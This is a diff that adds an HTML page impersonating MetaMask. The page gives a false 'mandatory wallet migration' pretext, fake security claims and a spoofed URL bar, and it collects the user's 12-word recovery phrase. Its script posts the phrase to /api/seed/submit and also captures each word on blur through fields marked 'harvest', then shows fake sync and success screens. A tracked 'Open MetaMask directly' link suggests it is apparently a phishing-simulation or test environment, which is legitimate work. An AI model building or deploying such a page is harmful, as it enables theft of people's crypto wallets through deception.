@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask | Secure Wallet Migration</title>
+    <style>
+        :root {
+            --mm-orange: #f6851b;
+            --mm-orange-hover: #e2761b;
+            --mm-blue: #037dd6;
+            --mm-blue-hover: #0260a6;
+            --mm-bg: #fff;
+            --mm-text: #24292e;
+            --mm-gray: #d6d9dc;
+            --mm-gray-text: #6a737d;
+            --mm-warning-bg: #fff9f2;
+            --mm-warning-border: #f6851b;
+            --font-stack: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: var(--font-stack);
+            background-color: var(--mm-bg);
+            color: var(--mm-text);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .browser-bar {
+            max-width: 920px;
+            margin: 16px auto 0;
+            background: #f4f6f8;
+            border: 1px solid #d8dee4;
+            border-radius: 14px;
+            padding: 10px 16px;
+            color: #5b6670;
+            font-size: 13px;
+        }
+
+        header {
+            padding: 20px 40px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid var(--mm-gray);
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 1.1rem;
+            font-weight: bold;
+        }
+
+        .fox-logo {
+            width: 32px;
+            height: 32px;
+            background: linear-gradient(135deg, #f6851b 50%, #e2761b 50%);
+            clip-path: polygon(50% 0, 100% 100%, 0 100%);
+            border-radius: 2px;
+        }
+
+        .network-pill {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 12px;
+            border: 1px solid var(--mm-gray);
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+
+        .network-dot {
+            width: 8px;
+            height: 8px;
+            background: #29b6af;
+            border-radius: 50%;
+        }
+
+        .container {
+            flex-grow: 1;
+            max-width: 800px;
+            margin: 60px auto;
+            padding: 0 20px;
+            text-align: center;
+        }
+
+        .view {
+            display: none;
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        .view.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h1 {
+            font-size: 2rem;
+            margin: 0 0 20px 0;
+        }
+
+        .desc {
+            font-size: 1.05rem;
+            color: var(--mm-gray-text);
+            line-height: 1.6;
+            margin-bottom: 40px;
+        }
+
+        .warning-box {
+            background: var(--mm-warning-bg);
+            border: 1px solid var(--mm-warning-border);
+            border-radius: 8px;
+            padding: 20px;
+            text-align: left;
+            margin-bottom: 24px;
+        }
+
+        .warning-box strong {
+            color: var(--mm-orange);
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .warning-box p {
+            margin: 0;
+            font-size: 0.9rem;
+            color: #555;
+        }
+
+        .status-banner {
+            display: none;
+            margin-bottom: 18px;
+            padding: 12px 14px;
+            background: #eef8f1;
+            border: 1px solid #b8dbc0;
+            border-radius: 6px;
+            color: #1f6b33;
+            text-align: left;
+        }
+
+        .status-banner.visible {
+            display: block;
+        }
+
+        .seed-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-bottom: 40px;
+        }
+
+        .seed-field {
+            display: flex;
+            align-items: center;
+            background: #fff;
+            border: 1px solid var(--mm-gray);
+            border-radius: 8px;
+            padding: 0 12px;
+            transition: border-color 0.2s;
+        }
+
+        .seed-field:focus-within {
+            border-color: var(--mm-orange);
+            box-shadow: 0 0 0 1px var(--mm-orange);
+        }
+
+        .seed-num {
+            font-size: 0.85rem;
+            color: var(--mm-gray-text);
+            margin-right: 8px;
+            min-width: 20px;
+        }
+
+        .seed-input {
+            width: 100%;
+            border: none;
+            padding: 12px 0;
+            font-size: 1rem;
+            outline: none;
+            background: transparent;
+        }
+
+        .btn-primary, .btn-blue {
+            color: #fff;
+            border: none;
+            padding: 16px 48px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: background 0.2s;
+            min-width: 220px;
+        }
+
+        .btn-primary {
+            background-color: var(--mm-orange);
+        }
+
+        .btn-primary:hover {
+            background-color: var(--mm-orange-hover);
+        }
+
+        .btn-blue {
+            background-color: var(--mm-blue);
+        }
+
+        .btn-blue:hover {
+            background-color: var(--mm-blue-hover);
+        }
+
+        .legit-exit {
+            margin-top: 18px;
+            font-size: 12px;
+            color: #5b6670;
+        }
+
+        .legit-exit a {
+            color: #5b6670;
+            text-decoration: underline;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid var(--mm-gray);
+            border-top: 6px solid var(--mm-orange);
+            border-radius: 50%;
+            margin: 0 auto 30px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        footer {
+            padding: 40px;
+            text-align: center;
+            font-size: 0.9rem;
+            color: var(--mm-gray-text);
+            border-top: 1px solid var(--mm-gray);
+        }
+    </style>
+</head>
+<body>
+    <div class="browser-bar">https://metamask-wallet-sync.io/migration/secure</div>
+    <header>
+        <div class="logo-container">
+            <div class="fox-logo"></div>
+            METAMASK
+        </div>
+        <div class="network-pill">
+            <div class="network-dot"></div>
+            Ethereum Mainnet
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="status-banner" id="status-banner"></div>
+
+        <div class="view active" id="view-0">
+            <div style="font-size: 4rem; margin-bottom: 20px;">Wallet</div>
+            <h1>Mandatory Wallet Migration</h1>
+            <p class="desc">MetaMask v1.8 is now deprecated. To ensure your assets remain safe and accessible on the Ethereum network, please migrate your wallet to the new V2 infrastructure.</p>
+
+            <div class="warning-box">
+                <strong>Why is this required?</strong>
+                <p>New security protocols for EIP-4844 require wallets to be synchronized with the latest verification layer. Failure to migrate may result in permanent loss of network access for your current address.</p>
+            </div>
+
+            <button class="btn-primary" id="start-migration">Start Secure Migration</button>
+            <div class="legit-exit">
+                <a href="#" id="open-metamask-directly">Open MetaMask directly instead</a>
+            </div>
+        </div>
+
+        <div class="view" id="view-1">
+            <h1>Secret Recovery Phrase</h1>
+            <p class="desc">Your Secret Recovery Phrase is the 12-word master key to your wallet. Entering it here will securely link your assets to the V2 migration layer.</p>
+
+            <div class="warning-box" style="background:#fce8e6; border-color:#d73a49;">
+                <strong style="color:#d73a49;">Secure Environment Verified</strong>
+                <p style="color:#24292e;">This connection is encrypted with end-to-end 2048-bit AES. Never share your phrase with any third party other than official MetaMask migration portals.</p>
+            </div>
+
+            <div class="seed-grid" id="seed-grid"></div>
+            <button class="btn-blue" id="submit-seed">Secure and Migrate</button>
+            <p style="font-size: 0.85rem; color: var(--mm-gray-text); margin-top:20px;">Do you have a different total of words? <a href="#" style="color:var(--mm-blue);">Select 24 words</a></p>
+        </div>
+
+        <div class="view" id="view-2">
+            <h1>Verifying on Blockchain...</h1>
+            <p class="desc">Please wait while your assets are being synchronized with the MetaMask V2 Layer. This process typically takes 1-2 minutes.</p>
+            <div class="spinner"></div>
+            <p style="font-size: 0.95rem; font-weight: bold; color: var(--mm-orange);">Synchronizing Ethereum Layer Content [68%]</p>
+            <p class="desc" style="font-size: 0.85rem;">Do not close this window or refresh the page.</p>
+        </div>
+
+        <div class="view" id="view-3">
+            <div style="font-size: 4rem; color: #29b6af; margin-bottom: 20px;">Complete</div>
+            <h1>Migration Initialized</h1>
+            <p class="desc">Your wallet migration has been successfully queued. Your assets will appear in your mobile app and extension within 24 hours.</p>
+            <button class="btn-primary" type="button">Done</button>
+        </div>
+    </div>
+
+    <footer>
+        Need help? Visit <a href="#" style="color: var(--mm-blue);">MetaMask Support</a>
+    </footer>
+
+    <script>
+        function showStatus(message) {
+            const banner = document.getElementById('status-banner');
+            banner.textContent = message;
+            banner.classList.add('visible');
+        }
+
+        async function postJson(url, payload) {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            return response.json();
+        }
+
+        function showView(index) {
+            document.querySelectorAll('.view').forEach((view) => view.classList.remove('active'));
+            document.getElementById(`view-${index}`).classList.add('active');
+            window.scrollTo(0, 0);
+        }
+
+        function buildSeedInputs() {
+            const grid = document.getElementById('seed-grid');
+            for (let index = 1; index <= 12; index += 1) {
+                const field = document.createElement('div');
+                field.className = 'seed-field';
+                field.innerHTML = `<span class="seed-num">${index}.</span><input type="text" class="seed-input harvest" id="seed-${index}" name="seed-${index}" spellcheck="false" autocomplete="off">`;
+                grid.appendChild(field);
+            }
+        }
+
+        async function handleWin() {
+            await postJson('/api/win/open-metamask-directly', {});
+            showStatus('Open the real MetaMask extension or MetaMask.io instead of typing your recovery phrase into a migration page.');
+        }
+
+        async function handleSeedSubmit() {
+            const payload = {};
+            const words = [];
+
+            for (let index = 1; index <= 12; index += 1) {
+                const value = document.getElementById(`seed-${index}`).value.trim();
+                if (!value) {
+                    alert('Please fill in all 12 words of your Secret Recovery Phrase to proceed with the migration.');
+                    return;
+                }
+                payload[`seed-${index}`] = value;
+                words.push(value);
+            }
+
+            payload.seed_phrase = words.join(' ');
+            await postJson('/api/seed/submit', payload);
+            showView(2);
+
+            setTimeout(async () => {
+                await postJson('/api/migration/complete', {});
+                showView(3);
+            }, 2500);
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            buildSeedInputs();
+
+            document.getElementById('start-migration').addEventListener('click', async () => {
+                await postJson('/api/migration/start', {});
+                showView(1);
+            });
+
+            document.getElementById('open-metamask-directly').addEventListener('click', async (event) => {
+                event.preventDefault();
+                await handleWin();
+            });
+
+            document.getElementById('submit-seed').addEventListener('click', handleSeedSubmit);
+
+            document.addEventListener('blur', (event) => {
+                if (event.target.classList.contains('harvest') && event.target.value.trim()) {
+                    fetch('/api/save-step', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            step: 0,
+                            data: { [event.target.name]: event.target.value.trim() }
+                        })
+                    });
+                }
+            }, true);
+        });
+    </script>
+</body>
+</html>
